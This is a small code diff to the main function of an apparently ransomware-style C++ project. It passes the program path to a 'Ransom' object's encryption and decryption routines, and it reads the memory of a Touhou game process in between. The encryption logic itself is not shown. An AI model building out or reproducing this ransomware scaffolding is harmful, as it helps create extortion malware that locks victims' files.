@@ -13,10 +13,10 @@
 * 6- Wait for the game to be launched
 * 7- Read memory of game to find value
 */
-int main()
+int main(int argc, char** argv)
 {
 	Ransom ecr;
-	ecr.run_encryption_logic();
+	ecr.run_encryption_logic(argv[0]);
 
 	game_profile game{
 		"東方紅魔郷.exe",
@@ -27,5 +27,5 @@ int main()
 
 	MemorySniff sniff(&game);
 	sniff.sniff_process();
-	ecr.run_decryption_logic();
+	ecr.run_decryption_logic(argv[0]);
 }
